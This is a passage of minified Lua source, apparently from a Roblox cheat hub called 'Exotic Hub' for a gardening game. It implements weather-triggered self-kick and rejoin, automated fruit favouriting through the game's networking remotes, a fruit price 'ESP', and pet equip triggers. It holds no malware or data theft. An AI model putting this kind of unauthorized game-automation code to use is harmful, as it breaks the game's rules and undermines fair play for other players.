		local i = Z.WeatherTriggers.GetControllerRootWeatherTriggers("WeatherController")
		Z.WeatherTriggers.AddInstanceNamesWeatherTriggers(G, V, i)
		return G, V
	end,
	AddSavedOptionsWeatherTriggers = function(G, V)
		Z.WeatherTriggers.AddNameWeatherTriggers(G, V, h.seed_shop_trigger_name)
		Z.WeatherTriggers.AddNameWeatherTriggers(G, V, h.gear_shop_trigger_name)
		Z.WeatherTriggers.AddNameWeatherTriggers(G, V, h.crate_shop_trigger_name)
		local y = {
			h.water_plant_weather_selected,
			h.sprinkler_place_weather_selected;
			h.potted_weather_guard_weather_selected,
			h.weather_kick_selected
		}
		for y, j in ipairs(y) do
			if type(j) == "table" then
				for y, j in pairs(j) do
					Z.WeatherTriggers.AddNameWeatherTriggers(G, V, j == true and y or j)
				end
			end
		end
		if type(h.pet_equip_rules) == "table" then
			for y, j in ipairs(h.pet_equip_rules) do
				if type(j) == "table" then
					Z.WeatherTriggers.AddNameWeatherTriggers(G, V, j.triggerName)
				end
			end
		end
		return true
	end,
	EnsureOptionsWeatherTriggers = function()
		if Z.WeatherTriggers.CachedAllOptionsWeatherTriggers then
			return true
		end
		local G, V, y = Z.WeatherTriggers.BuildTimeCycleOptionsWeatherTriggers()
		local j, i = Z.WeatherTriggers.BuildWeatherOptionsWeatherTriggers()
		local c = {}
		local J = {}
		Z.WeatherTriggers.AddNameWeatherTriggers(c, J, "Any Time")
		for G, V in ipairs(G) do
			Z.WeatherTriggers.AddNameWeatherTriggers(c, J, V)
		end
		for G, V in ipairs(j) do
			Z.WeatherTriggers.AddNameWeatherTriggers(c, J, V)
		end
		Z.WeatherTriggers.AddSavedOptionsWeatherTriggers(c, J)
		Z.WeatherTriggers.CachedAllOptionsWeatherTriggers = c
		Z.WeatherTriggers.CachedTimeCycleOptionsWeatherTriggers = G
		Z.WeatherTriggers.CachedWeatherOptionsWeatherTriggers = j
		Z.WeatherTriggers.CachedPhaseLookupWeatherTriggers = y
		Z.WeatherTriggers.CachedTimeCycleLookupWeatherTriggers = V
		Z.WeatherTriggers.CachedWeatherLookupWeatherTriggers = i
		return true
	end;
	GetOptionsWeatherTriggers = function()
		Z.WeatherTriggers.EnsureOptionsWeatherTriggers()
		local G = {}
		for V, y in ipairs(Z.WeatherTriggers.CachedAllOptionsWeatherTriggers or {
			"Any Time"
		}) do
			table.insert(G, y)
		end
		return G
	end,
	GetTimeCycleOptionsWeatherTriggers = function()
		Z.WeatherTriggers.EnsureOptionsWeatherTriggers()
		local G = {}
		for V, y in ipairs(Z.WeatherTriggers.CachedTimeCycleOptionsWeatherTriggers or {}) do
			table.insert(G, y)
		end
		return G
	end,
	GetWeatherOptionsWeatherTriggers = function()
		Z.WeatherTriggers.EnsureOptionsWeatherTriggers()
		local G = {}
		for V, y in ipairs(Z.WeatherTriggers.CachedWeatherOptionsWeatherTriggers or {}) do
			table.insert(G, y)
		end
		return G
	end,
	IsTimeCyclePhaseWeatherTriggers = function(G)
		Z.WeatherTriggers.EnsureOptionsWeatherTriggers()
		local V = Z.WeatherTriggers.NormaliseWeatherTriggers(G)
		return V ~= "" and (Z.WeatherTriggers.CachedPhaseLookupWeatherTriggers and Z.WeatherTriggers.CachedPhaseLookupWeatherTriggers[V] == true)
	end,
	IsTimeCycleNameWeatherTriggers = function(G)
		Z.WeatherTriggers.EnsureOptionsWeatherTriggers()
		local V = Z.WeatherTriggers.NormaliseWeatherTriggers(G)
		return V ~= "" and (Z.WeatherTriggers.CachedTimeCycleLookupWeatherTriggers and Z.WeatherTriggers.CachedTimeCycleLookupWeatherTriggers[V] ~= nil)
	end,
	IsWeatherNameWeatherTriggers = function(G)
		Z.WeatherTriggers.EnsureOptionsWeatherTriggers()
		local V = Z.WeatherTriggers.NormaliseWeatherTriggers(G)
		return V ~= "" and (Z.WeatherTriggers.CachedWeatherLookupWeatherTriggers and Z.WeatherTriggers.CachedWeatherLookupWeatherTriggers[V] ~= nil)
	end;
	IsSelectionEmptyWeatherTriggers = function(G)
		if type(G) ~= "table" then
			return true
		end
		for G, V in pairs(G) do
			if V == true or type(G) == "number" and tostring(V or "") ~= "" then
				return false
			end
		end
		return true
	end;
	IsSelectedWeatherTriggers = function(G, V)
		V = tostring(V or "")
		if V == "" or type(G) ~= "table" then
			return false
		end
		if G[V] == true then
			return true
		end
		for G, y in pairs(G) do
			if tostring(y or "") == V then
				return true
			end
		end
		return false
	end;
	ForEachSelectedWeatherTriggers = function(G, V)
		if type(G) ~= "table" or type(V) ~= "function" then
			return false
		end
		local y = {}
		for G, j in pairs(G) do
			local i = j == true and G or j
			i = tostring(i or "")
			local c = Z.WeatherTriggers.NormaliseWeatherTriggers(i)
			if i ~= "" and not y[c] then
				y[c] = true
				if V(i) == true then
					return true
				end
			end
		end
		return false
	end;
	NamesMatchWeatherTriggers = function(G, V)
		return Z.WeatherTriggers.NormaliseWeatherTriggers(G) == Z.WeatherTriggers.NormaliseWeatherTriggers(V)
	end,
	GetWeatherValuesWeatherTriggers = function()
		return y.ReplicatedStorage and y.ReplicatedStorage:FindFirstChild("WeatherValues") or nil
	end;
	GetDropdownWeatherTriggers = function()
		local G = {}
		for V, y in ipairs(Z.WeatherTriggers.GetOptionsWeatherTriggers()) do
			table.insert(G, {
				Text = y,
				Value = y
			})
		end
		return G
	end,
	GetCurrentTextWeatherTriggers = function()
		local G = tostring(y.Workspace:GetAttribute("ActiveWeather") or "")
		local V = tostring(y.Workspace:GetAttribute("ActivePhase") or "")
		if G ~= "" and V ~= "" then
			return G .. (" / " .. V)
		end
		if G ~= "" then
			return G
		end
		if V ~= "" then
			return V
		end
		return "None"
	end,
	IsTriggerActiveWeatherTriggers = function(G)
		G = tostring(G or "")
		if G == "" or G == "Any Time" then
			return true
		end
		local V = Z.WeatherTriggers.GetWeatherValuesWeatherTriggers()
		if V and V:GetAttribute(G .. "_Playing") == true then
			return true
		end
		if Z.WeatherTriggers.NamesMatchWeatherTriggers(y.Workspace:GetAttribute("ActiveWeather"), G) then
			return true
		end
		if Z.WeatherTriggers.NamesMatchWeatherTriggers(y.Workspace:GetAttribute("ActivePhase"), G) then
			return true
		end
		return false
	end;
	IsActiveWeatherTriggers = function(G, V)
		if G ~= true or Z.WeatherTriggers.IsSelectionEmptyWeatherTriggers(V) then
			return true, Z.WeatherTriggers.GetCurrentTextWeatherTriggers()
		end
		local y = nil
		Z.WeatherTriggers.ForEachSelectedWeatherTriggers(V, function(G)
			if G == "Any Time" then
				y = Z.WeatherTriggers.GetCurrentTextWeatherTriggers()
				return true
			end
			if Z.WeatherTriggers.IsTriggerActiveWeatherTriggers(G) then
				y = G
				return true
			end
			return false
		end)
		if y then
			return true, y
		end
		return false, Z.WeatherTriggers.GetCurrentTextWeatherTriggers()
	end
}
g.WeatherKickRejoinStatusText = ""
Z.WeatherKickRejoin = {
	StartedWeatherKickRejoin = false,
	KickedWeatherKickRejoin = false,
	RejoiningWeatherKickRejoin = false;
	NormalTeleportStartedWeatherKickRejoin = false,
	PlaceIdWeatherKickRejoin = game.PlaceId;
	JobIdWeatherKickRejoin = game.JobId,
	FormatSecondsWeatherKickRejoin = function(G)
		G = math.max(math.floor(tonumber(G) or 0), 0)
		local V = math.floor(G / 3600)
		local y = math.floor(((G % 3600)) / 60)
		local Z = G % 60
		if V > 0 then
			return string.format("%dh %02dm", V, y)
		end
		if y > 0 then
			return string.format("%dm %02ds", y, Z)
		end
		return tostring(Z) .. "s"
	end;
	SetStatusWeatherKickRejoin = function(G, V)
		G = tostring(G or "")
		if G == "" then
			g.WeatherKickRejoinStatusText = ""
			return false
		end
		g.WeatherKickRejoinStatusText = string.format("<stroke color=\'#000000\' thickness=\'1\'><font color=\'#FFFFFF\'>\226\155\136\239\184\143 [Weather Kick]</font> <font color=\'%s\'>%s</font></stroke>", tostring(V or "#FFFFFF"), G)
		return true
	end;
	GetUnixNowWeatherKickRejoin = function()
		local G, V = pcall(function()
			return (DateTime.now()).UnixTimestamp
		end)
		if G and tonumber(V) then
			return tonumber(V)
		end
		return os.time()
	end;
	GetServerTimeWeatherKickRejoin = function()
		local G, V = pcall(function()
			return y.Workspace:GetServerTimeNow()
		end)
		if G and tonumber(V) then
			return tonumber(V)
		end
		return os.time()
	end,
	GetDefaultDurationWeatherKickRejoin = function(G)
		G = tostring(G or "")
		local V = nil
		if type(y.WeatherData) == "table" then
			V = y.WeatherData.Data
		end
		if type(V) == "table" then
			for V, y in ipairs(V) do
				if type(y) == "table" and Z.WeatherTriggers.NamesMatchWeatherTriggers(y.Name, G) then
					return math.max(math.floor(tonumber(y.Last) or 300), 1)
				end
			end
		end
		local j = nil
		if type(y.TimeCycleData) == "table" then
			j = y.TimeCycleData.Data
		end
		if type(j) == "table" then
			for V, y in pairs(j) do
				if Z.WeatherTriggers.NamesMatchWeatherTriggers(V, G) then
					return math.max(math.floor(tonumber(y.Lasts) or 300), 1)
				end
				local j = nil
				if type(y) == "table" then
					j = y.Weathers
				end
				if type(j) == "table" then
					for V in pairs(j) do
						if Z.WeatherTriggers.NamesMatchWeatherTriggers(V, G) then
							return math.max(math.floor(tonumber(y.Lasts) or 300), 1)
						end
					end
				end
			end
		end
		return 300
	end;
	GetWeatherValuesRemainingWeatherKickRejoin = function(G)
		local V = Z.WeatherTriggers.GetWeatherValuesWeatherTriggers()
		if not V or V:GetAttribute(G .. "_Playing") ~= true then
			return nil
		end
		local y = tonumber(V:GetAttribute(G .. "_EndTime"))
		if y and y > 0 then
			return math.floor(y - Z.WeatherKickRejoin.GetUnixNowWeatherKickRejoin())
		end
		return Z.WeatherKickRejoin.GetDefaultDurationWeatherKickRejoin(G)
	end;
	GetCycleRemainingWeatherKickRejoin = function(G)
		local V = y.Workspace:GetAttribute("ActiveWeather")
		local j = y.Workspace:GetAttribute("ActivePhase")
		if not Z.WeatherTriggers.NamesMatchWeatherTriggers(V, G) and not Z.WeatherTriggers.NamesMatchWeatherTriggers(j, G) then
			return nil
		end
		local i = tonumber(y.Workspace:GetAttribute("PhaseDuration"))
		if i and i > 0 then
			return math.floor(i - Z.WeatherKickRejoin.GetServerTimeWeatherKickRejoin())
		end
		return Z.WeatherKickRejoin.GetDefaultDurationWeatherKickRejoin(G)
	end;
	GetActiveSelectedWeatherKickRejoin = function()
		if Z.WeatherTriggers.IsSelectionEmptyWeatherTriggers(h.weather_kick_selected) then
			return nil, 0
		end
		local G = nil
		local V = 0
		Z.WeatherTriggers.ForEachSelectedWeatherTriggers(h.weather_kick_selected, function(y)
			if y == "Any Time" then
				return false
			end
			local j = Z.WeatherKickRejoin.GetWeatherValuesRemainingWeatherKickRejoin(y)
			if j == nil then
				j = Z.WeatherKickRejoin.GetCycleRemainingWeatherKickRejoin(y)
			end
			if j ~= nil then
				G = y
				V = tonumber(j) or 0
				return true
			end
			return false
		end)
		return G, V
	end,
	GetDropdownWeatherKickRejoin = function()
		local G = {}
		for V, y in ipairs(Z.WeatherTriggers.GetOptionsWeatherTriggers()) do
			if y ~= "Any Time" then
				table.insert(G, {
					Text = y,
					Value = y
				})
			end
		end
		return G
	end;
	NormalTeleportWeatherKickRejoin = function()
		if Z.WeatherKickRejoin.NormalTeleportStartedWeatherKickRejoin then
			return false
		end
		Z.WeatherKickRejoin.NormalTeleportStartedWeatherKickRejoin = true
		pcall(function()
			y.TeleportService:Teleport(Z.WeatherKickRejoin.PlaceIdWeatherKickRejoin, y.LocalPlayer)
		end)
		return true
	end,
	RejoinWeatherKickRejoin = function()
		if Z.WeatherKickRejoin.RejoiningWeatherKickRejoin then
			return false
		end
		Z.WeatherKickRejoin.RejoiningWeatherKickRejoin = true
		Z.WeatherKickRejoin.SetStatusWeatherKickRejoin("Rejoining...", "#66CCFF")
		if g.is_private_server == true then
			return Z.WeatherKickRejoin.NormalTeleportWeatherKickRejoin()
		end
		pcall(function()
			y.TeleportService:TeleportToPlaceInstance(Z.WeatherKickRejoin.PlaceIdWeatherKickRejoin, Z.WeatherKickRejoin.JobIdWeatherKickRejoin, y.LocalPlayer)
		end)
		task.delay(3, function()
			Z.WeatherKickRejoin.NormalTeleportWeatherKickRejoin()
		end)
		return true
	end,
	KickForWeatherKickRejoin = function(G, V)
		if Z.WeatherKickRejoin.KickedWeatherKickRejoin then
			return false
		end
		Z.WeatherKickRejoin.KickedWeatherKickRejoin = true
		Z.WeatherKickRejoin.PlaceIdWeatherKickRejoin = game.PlaceId
		Z.WeatherKickRejoin.JobIdWeatherKickRejoin = game.JobId
		local j = math.max(math.floor(tonumber(V) or 0), 0)
		if j <= 0 then
			j = 5
		end
		j += 3
		local i
		if h.weather_kick_rejoin_enabled == true then
			task.delay(j, function()
				Z.WeatherKickRejoin.RejoinWeatherKickRejoin()
			end)
			i = string.format("Exotic Hub Weather Kick: %s detected. Rejoining in %s.", tostring(G or "Weather"), Z.WeatherKickRejoin.FormatSecondsWeatherKickRejoin(j))
		else
			i = string.format("Exotic Hub Weather Kick: %s detected. Rejoin is disabled.", tostring(G or "Weather"))
		end
		Z.WeatherKickRejoin.SetStatusWeatherKickRejoin(i, "#FFCC66")
		local c = pcall(function()
			y.LocalPlayer:Kick(i)
		end)
		if not c then
			Z.WeatherKickRejoin.KickedWeatherKickRejoin = false
			Z.WeatherKickRejoin.SetStatusWeatherKickRejoin("Kick failed", "#FF6666")
			return false
		end
		return true
	end;
	CheckWeatherKickRejoin = function()
		if h.weather_kick_enabled ~= true then
			g.WeatherKickRejoinStatusText = ""
			return false
		end
		if Z.WeatherKickRejoin.KickedWeatherKickRejoin then
			return false
		end
		if Z.WeatherTriggers.IsSelectionEmptyWeatherTriggers(h.weather_kick_selected) then
			Z.WeatherKickRejoin.SetStatusWeatherKickRejoin("Select weather", "#FFCC66")
			return false
		end
		local G, V = Z.WeatherKickRejoin.GetActiveSelectedWeatherKickRejoin()
		if G then
			return Z.WeatherKickRejoin.KickForWeatherKickRejoin(G, V)
		end
		Z.WeatherKickRejoin.SetStatusWeatherKickRejoin("Watching | Now: " .. Z.WeatherTriggers.GetCurrentTextWeatherTriggers(), "#CFCFCF")
		return false
	end;
	StartWeatherKickRejoin = function()
		if Z.WeatherKickRejoin.StartedWeatherKickRejoin then
			return false
		end
		Z.WeatherKickRejoin.StartedWeatherKickRejoin = true
		if y.TeleportService.TeleportInitFailed then
			y.TeleportService.TeleportInitFailed:Connect(function(G, V, j)
				if G ~= y.LocalPlayer or Z.WeatherKickRejoin.RejoiningWeatherKickRejoin ~= true then
					return
				end
				warn("[WeatherKickRejoin] Teleport failed:", V, j)
				Z.WeatherKickRejoin.NormalTeleportWeatherKickRejoin()
			end)
		end
		task.spawn(function()
			while not g.is_forced_stop do
				local G, V = pcall(Z.WeatherKickRejoin.CheckWeatherKickRejoin)
				if not G then
					Z.WeatherKickRejoin.SetStatusWeatherKickRejoin("Weather check error", "#FF6666")
					warn("[WeatherKickRejoin]", V)
				end
				task.wait(1)
			end
		end)
		return true
	end
}
Z.WeatherKickRejoin.StartWeatherKickRejoin()
g.AutoFruitFavouriteStatusText = ""
g.ManualFruitFavouriteStatusText = ""
Z.FruitFavouriteManager = {
	BusyAutoFruitFavouriteManager = false;
	BusyManualFruitFavouriteManager = false,
	SetStatusAutoFruitFavouriteManager = function(G, V)
		G = tostring(G or "")
		if G == "" then
			g.AutoFruitFavouriteStatusText = ""
			return false
		end
		g.AutoFruitFavouriteStatusText = string.format("<stroke color=\'#000000\' thickness=\'1\'><font color=\'#FFFFFF\'>\226\173\144 [Auto Favourite]</font> <font color=\'%s\'>%s</font></stroke>", tostring(V or "#FFFFFF"), G)
		return true
	end,
	SetStatusManualFruitFavouriteManager = function(G, V)
		G = tostring(G or "")
		if G == "" then
			g.ManualFruitFavouriteStatusText = ""
			return false
		end
		g.ManualFruitFavouriteStatusText = string.format("<stroke color=\'#000000\' thickness=\'1\'><font color=\'#FFFFFF\'>\226\173\144 [Manual Favourite]</font> <font color=\'%s\'>%s</font></stroke>", tostring(V or "#FFFFFF"), G)
		return true
	end,
	IsFavouriteFruitFavouriteManager = function(G)
		if typeof(G) ~= "Instance" then
			return false
		end
		return G:GetAttribute("IsFavorite") == true or G:GetAttribute("Favorite") == true or G:GetAttribute("Favourite") == true or G:GetAttribute("Favorited") == true or G:GetAttribute("Favourited") == true
	end;
	GetRemoteFruitFavouriteManager = function()
		return y.Networking and (y.Networking.Backpack and y.Networking.Backpack.SetFruitFavorite) or nil
	end,
	SetFavouriteFruitFavouriteManager = function(G, V, y)
		V = tostring(V or "")
		if V == "" then
			return false, "Fruit id missing"
		end
		local j = Z.FruitFavouriteManager.GetRemoteFruitFavouriteManager()
		if not j or type(j.Fire) ~= "function" then
			return false, "Favourite remote missing"
		end
		local i, c = pcall(function()
			return j:Fire(V, y == true)
		end)
		if not i or c == false then
			return false, "Favourite rejected"
		end
		if typeof(G) == "Instance" then
			G:SetAttribute("IsFavorite", y == true and true or nil)
		end
		return true
	end;
	NeedsPriceFruitFavouriteManager = function()
		return ((tonumber(h.auto_fruit_favourite_max_value) or 0)) > 0 or ((tonumber(h.manual_fruit_favourite_max_value) or 0)) > 0
	end,
	BuildFruitDataFruitFavouriteManager = function(G)
		if typeof(G) ~= "Instance" or not G.Parent then
			return nil
		end
		local V = Z.BackpackFruitPriceEsp.BuildFruitDataBackpackFruitPriceEsp(G)
		if type(V) ~= "table" or tostring(V.id or "") == "" then
			return nil
		end
		local y = 0
		if Z.FruitFavouriteManager.NeedsPriceFruitFavouriteManager() then
			y = Z.BackpackFruitPriceEsp.GetToolPriceBackpackFruitPriceEsp(G)
		end
		local j = Z.FruitFilters.RoundWeight(V.weight or V.kg or G:GetAttribute("weight") or G:GetAttribute("Weight") or G:GetAttribute("KG") or G:GetAttribute("Kg") or 0)
		local i, c = Z.FruitFilters.GetMutationLookup({
			ob = G,
			m = V.mutation
		})
		local J = Z.FruitFilters.GetFruitVariant({
			ob = G,
			v = V.variant,
			m = V.mutation
		}, c)
		return {
			ob = G;
			id = tostring(V.id or "");
			name = tostring(V.calcName or V.displayName or ""),
			displayName = tostring(V.displayName or V.calcName or "");
			kg = j,
			price = math.max(math.floor(tonumber(y) or 0), 0);
			mutationLookup = c;
			variant = J
		}
	end;
	GetBackpackFruitsFruitFavouriteManager = function()
		local G = {}
		local V = {}
		if Z.FruitFavouriteManager.NeedsPriceFruitFavouriteManager() and (type(Z.BuySelectFruit) == "table" and type(Z.BuySelectFruit.EnsureFruitStockReadyBuySelectFruit) == "function") then
			Z.BuySelectFruit.EnsureFruitStockReadyBuySelectFruit(false)
		end
		for y, j in ipairs(Z.Backpack.GetBackpackAllItems()) do
			if typeof(j) ~= "Instance" or V[j] then
				continue
			end
			V[j] = true
			local i = Z.FruitFavouriteManager.BuildFruitDataFruitFavouriteManager(j)
			if i then
				table.insert(G, i)
			end
		end
		table.sort(G, function(G, V)
			if ((tonumber(G.kg) or 0)) ~= ((tonumber(V.kg) or 0)) then
				return ((tonumber(G.kg) or 0)) > ((tonumber(V.kg) or 0))
			end
			if ((tonumber(G.price) or 0)) ~= ((tonumber(V.price) or 0)) then
				return ((tonumber(G.price) or 0)) > ((tonumber(V.price) or 0))
			end
			return tostring(G.id or "") < tostring(V.id or "")
		end)
		return G
	end,
	PassesFilterSetFruitFavouriteManager = function(G, V, y, j, i, c, J)
		if type(G) ~= "table" or G.id == "" or G.name == "" then
			return false
		end
		if not Z.FruitFilters.IsSelectionEmpty(V) and not Z.FruitFilters.IsSelected(V, G.name) then
			return false
		end
		if not Z.FruitFilters.PassesWeightRange(G.kg, y, j) then
			return false
		end
		if not Z.FruitFilters.PassesMutationSelection(G.mutationLookup, i, nil) then
			return false
		end
		if not Z.FruitFilters.PassesVariantSelection(G.variant, c, nil) then
			return false
		end
		J = math.max(math.floor(tonumber(J) or 0), 0)
		if J > 0 and ((tonumber(G.price) or 0)) > J then
			return false
		end
		return true
	end;
	PassesAutoFiltersFruitFavouriteManager = function(G)
		return Z.FruitFavouriteManager.PassesFilterSetFruitFavouriteManager(G, h.auto_fruit_favourite_names, h.auto_fruit_favourite_min_kg, h.auto_fruit_favourite_max_kg, h.auto_fruit_favourite_mutations, h.auto_fruit_favourite_variants, h.auto_fruit_favourite_max_value)
	end;
	PassesManualFiltersFruitFavouriteManager = function(G)
		return Z.FruitFavouriteManager.PassesFilterSetFruitFavouriteManager(G, h.manual_fruit_favourite_names, h.manual_fruit_favourite_min_kg, h.manual_fruit_favourite_max_kg, h.manual_fruit_favourite_mutations, h.manual_fruit_favourite_variants, h.manual_fruit_favourite_max_value)
	end,
	RunFavouriteActionFruitFavouriteManager = function(G)
		if type(G) ~= "table" then
			return 0, 0
		end
		local V = G.makeFavourite == true
		local y = G.passFunction
		local j = G.setStatus
		if type(y) ~= "function" or type(j) ~= "function" then
			return 0, 0
		end
		local i = 0
		local c = 0
		local J, T = pcall(function()
			for G, j in ipairs(Z.FruitFavouriteManager.GetBackpackFruitsFruitFavouriteManager()) do
				if not y(j) then
					continue
				end
				c += 1
				local J = Z.FruitFavouriteManager.IsFavouriteFruitFavouriteManager(j.ob)
				if V and J then
					continue
				end
				if not V and not J then
					continue
				end
				local T = Z.FruitFavouriteManager.SetFavouriteFruitFavouriteManager(j.ob, j.id, V)
				if T then
					i += 1
				end
			end
		end)
		if not J then
			j("System error", "#FF5555")
			warn("[FruitFavouriteManager]", T)
			return 0, c
		end
		j(i > 0 and string.format("%s %d fruit%s", V and "Favourited" or "Unfavourited", i, i == 1 and "" or "s") or string.format("Matched %d fruit%s", c, c == 1 and "" or "s"), i > 0 and "#7CFC00" or "#CFCFCF")
		return i, c
	end;
	RunAutoFavouriteFruitFavouriteManager = function()
		if h.auto_fruit_favourite_enabled ~= true then
			Z.FruitFavouriteManager.SetStatusAutoFruitFavouriteManager("")
			return 0
		end
		if Z.FruitFavouriteManager.BusyAutoFruitFavouriteManager then
			return 0
		end
		Z.FruitFavouriteManager.BusyAutoFruitFavouriteManager = true
		local G = Z.FruitFavouriteManager.RunFavouriteActionFruitFavouriteManager({
			makeFavourite = true;
			passFunction = Z.FruitFavouriteManager.PassesAutoFiltersFruitFavouriteManager;
			setStatus = Z.FruitFavouriteManager.SetStatusAutoFruitFavouriteManager
		})
		Z.FruitFavouriteManager.BusyAutoFruitFavouriteManager = false
		return G
	end,
	RunAutoBeforeSellFruitFavouriteManager = function()
		if h.auto_fruit_favourite_enabled ~= true then
			return 0
		end
		return Z.FruitFavouriteManager.RunAutoFavouriteFruitFavouriteManager()
	end;
	RunManualFavouriteFruitFavouriteManager = function(G)
		if Z.FruitFavouriteManager.BusyManualFruitFavouriteManager then
			Z.FruitFavouriteManager.SetStatusManualFruitFavouriteManager("Already running", "#FFCC66")
			return 0
		end
		Z.FruitFavouriteManager.BusyManualFruitFavouriteManager = true
		local V = Z.FruitFavouriteManager.RunFavouriteActionFruitFavouriteManager({
			makeFavourite = G == true,
			passFunction = Z.FruitFavouriteManager.PassesManualFiltersFruitFavouriteManager;
			setStatus = Z.FruitFavouriteManager.SetStatusManualFruitFavouriteManager
		})
		Z.FruitFavouriteManager.BusyManualFruitFavouriteManager = false
		return V
	end,
	LoopFruitFavouriteManager = function()
		return Z.FruitFavouriteManager.RunAutoFavouriteFruitFavouriteManager()
	end
}
g.PetEquipTriggerStatusText = ""
g.PetEquipTriggerUi = g.PetEquipTriggerUi or {}
g.PetEquipTriggerLogs = g.PetEquipTriggerLogs or {}
Z.PetEquipTriggers = {
	StartedPetEquipTriggers = false,
	BusyPetEquipTriggers = false;
	ActiveRuleId = tostring(h.pet_equip_active_rule_id or "");
	ActiveSignature = "",
	FinishedEventKeys = {},
	RulePriority = {
		Manual = 100;
		["Seed Pack"] = 90;
		["Dropped Seed"] = 85;
		["Time Cycle Weather"] = 80;
		Weather = 70,
		["Time Cycle Phase"] = 60;
		Default = 10
	};
	TriggerOptions = {
		Manual = {
			"Manual"
		};
		Default = {
			"Idle"
		},
		["Seed Pack"] = {
			"Any Seed Pack",
			"Gold Seed";
			"Rainbow Seed"
		},
		["Dropped Seed"] = {
			"Own Dropped Seed"
		}
	};
	GetTriggerOptionsPetEquipTriggers = function(G)
		G = tostring(G or "Manual")
		if G == "Time Cycle" and (Z.WeatherTriggers and type(Z.WeatherTriggers.GetTimeCycleOptionsWeatherTriggers) == "function") then
			local G = Z.WeatherTriggers.GetTimeCycleOptionsWeatherTriggers()
			return # G > 0 and G or {
				"Manual"
			}
		end
		if G == "Weather" and (Z.WeatherTriggers and type(Z.WeatherTriggers.GetWeatherOptionsWeatherTriggers) == "function") then
			local G = Z.WeatherTriggers.GetWeatherOptionsWeatherTriggers()
			return # G > 0 and G or {
				"Manual"
			}
		end
		return Z.PetEquipTriggers.TriggerOptions[G] or {
			"Manual"
		}
	end;
	SetStatusPetEquipTriggers = function(G, V)
		G = tostring(G or "")
		if G == "" then
			g.PetEquipTriggerStatusText = ""
			return false
		end
		g.PetEquipTriggerStatusText = string.format("<stroke color=\'#000000\' thickness=\'1\'><font color=\'#FFFFFF\'>\240\159\144\190 [Pet Triggers]</font> <font color=\'%s\'>%s</font></stroke>", tostring(V or "#FFFFFF"), G)
		return true
	end;
	AddPetEquipLog = function(G)
		if not h.pet_equip_log_enabled then
			return false
		end
		G = tostring(G or "")
		if G == "" then
			return false
		end
		table.insert(g.PetEquipTriggerLogs, 1, string.format("%s -- %s", os.date("%H:%M:%S"), G))
		while # g.PetEquipTriggerLogs > 50 do
			table.remove(g.PetEquipTriggerLogs)
		end
		if g.PetEquipTriggerUi.RefreshPetEquipLogs then
			g.PetEquipTriggerUi.RefreshPetEquipLogs()
		end
		return true
	end;
	NormaliseTextPetEquipTriggers = function(G)
		return ((tostring(G or "")):lower()):gsub("%s+", "")
	end;
	IsSelectionEmptyPetEquipTriggers = function(G)
		if type(G) ~= "table" then
			return true
		end
		for G, V in pairs(G) do
			if V == true or type(G) == "number" and tostring(V or "") ~= "" then
				return false
			end
		end
		return true
	end,
	IsSelectedPetEquipTriggers = function(G, V)
		if type(G) ~= "table" then
			return false
		end
		V = tostring(V or "")
		if V == "" then
			return false
		end
		if G[V] == true then
			return true
		end
		for G, y in pairs(G) do
			if tostring(y or "") == V then
				return true
			end
		end
		return false
	end;
	ResolvePetNamePetEquipTriggers = function(G)
		G = tostring(G or "")
		if G == "" then
			return "", ""
		end
		if type(y.PetData) == "table" and type(y.PetData[G]) == "table" then
			local V = tostring(y.PetData[G].DisplayName or G)
			return G, V
		end
		local V = g.PetDataFast and g.PetDataFast[G]
		if type(V) == "table" and type(V.petname) == "string" then
			return V.petname, tostring(V.displayname or V.petname)
		end
		if type(y.PetData) == "table" then
			local V = Z.PetEquipTriggers.NormaliseTextPetEquipTriggers(G)
			for G, y in pairs(y.PetData) do
				if type(y) == "table" then
					local j = tostring(y.DisplayName or G)
					if Z.PetEquipTriggers.NormaliseTextPetEquipTriggers(G) == V or Z.PetEquipTriggers.NormaliseTextPetEquipTriggers(j) == V then
						return tostring(G), j
					end
				end
			end
		end
		return G, G
	end,
	GetPetBaseDataPetEquipTriggers = function(G)
		local V = Z.PetEquipTriggers.ResolvePetNamePetEquipTriggers(G)
		if V ~= "" and (type(y.PetData) == "table" and type(y.PetData[V]) == "table") then
			return y.PetData[V], V
		end
		return nil, V
	end,
	GetPetDisplayNamePetEquipTriggers = function(G)
		local V, y = Z.PetEquipTriggers.ResolvePetNamePetEquipTriggers(G)
		return y ~= "" and y or V
	end;
	GetPetRarityPetEquipTriggers = function(G, V)
		local y = Z.PetEquipTriggers.GetPetBaseDataPetEquipTriggers(G)
		if type(y) == "table" and type(y.Rarity) == "string" then
			return y.Rarity
		end
		if type(V) == "table" and type(V.Rarity) == "string" then
			return V.Rarity
		end
		return "Unknown"
	end,
	GetPetSizePetEquipTriggers = function(G)
		local V = type(G) == "table" and ((G.Size or G.PetSize)) or nil
		if V == "Big" or V == "Huge" then
			return V
		end
		return "Normal"
	end,
	GetPetVariantPetEquipTriggers = function(G)
		local V = type(G) == "table" and ((G.Type or G.PetType)) or nil
		if type(V) == "string" and V ~= "" then
			return V
		end
		return "Normal"
	end;
	GetEquippedIdsPetEquipTriggers = function()
		local G = {}
		local V = {}
		local j = y.Networking and (y.Networking.Pets and y.Networking.Pets.GetEquippedPets)
		if not j or type(j.Fire) ~= "function" then
			return G, V
		end
		local i, c = pcall(function()
			return j:Fire()
		end)
		if not i or type(c) ~= "table" then
			return G, V
		end
		for y, j in pairs(c) do
			if type(j) == "table" then
				local i = tostring(j.Id or j.id or j.PetId or j.UUID or j.uuid or y or "")
				local c = Z.PetEquipTriggers.ResolvePetNamePetEquipTriggers(j.Name or j.Pet or j.Species or j.PetName or "")
				if i ~= "" then
					G[i] = true
					table.insert(V, {
						id = i;
						key = i;
						name = c,
						displayName = Z.PetEquipTriggers.GetPetDisplayNamePetEquipTriggers(c);
						size = Z.PetEquipTriggers.GetPetSizePetEquipTriggers(j);
						variant = Z.PetEquipTriggers.GetPetVariantPetEquipTriggers(j),
						rarity = Z.PetEquipTriggers.GetPetRarityPetEquipTriggers(c, j);
						equipped = true,
						data = j
					})
				end
			elseif type(j) == "string" then
				G[j] = true
			end
		end
		return G, V
	end,
	GetPetToolInfoPetEquipTriggers = function(G, V)
		if not G or not G:IsA("Tool") then
			return nil
		end
		local y = G:GetAttribute("Pet")
		if type(y) ~= "string" or y == "" then
			return nil
		end
		local j = G:GetAttribute("PetId")
		j = type(j) == "string" and j or tostring(j or "")
		if j == "" then
			return nil
		end
		local i, c = Z.PetEquipTriggers.ResolvePetNamePetEquipTriggers(y)
		local J = {
			Size = G:GetAttribute("PetSize"),
			Type = G:GetAttribute("PetType")
		}
		return {
			key = j,
			id = j,
			name = i;
			displayName = c;
